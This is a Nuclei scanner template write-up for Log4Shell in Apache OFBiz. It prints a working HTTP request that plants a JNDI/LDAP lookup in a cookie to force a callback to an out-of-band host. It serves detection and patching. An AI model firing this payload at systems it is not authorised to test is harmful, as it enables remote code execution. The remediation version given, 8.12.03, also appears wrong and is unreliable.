# Nuclei Template: Apache OFBiz - JNDI Remote Code Execution (Apache Log4j)
**Template ID:** apache-ofbiz-log4j-rce
**Vulnerability Class:** Code Injection
**Severity:** Critical
**CWE:** CWE-95
**Source:** Nuclei Template (`apache-ofbiz-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
Apache OFBiz is affected by a remote code execution vulnerability in the bundled Apache Log4j logging library. Apache Log4j is vulnerable due to insufficient protections on message lookup substitutions when dealing with user controlled input. A remote, unauthenticated attacker can exploit this, via a web request, to execute arbitrary code with the permission level of the running Java process.

## Steps to reproduce / Exploit Payload
```http
GET /webtools/control/main HTTP/1.1
Host: {{Hostname}}
Cookie: OFBiz.Visitor=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.cookie.{{interactsh-url}}}
```

## Remediation
Upgrade to Apache OFBiz version 8.12.03 or later.

## References
- https://issues.apache.org/jira/browse/OFBIZ-12449
- https://ofbiz.apache.org/
- https://logging.apache.org/log4j/2.x/security.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
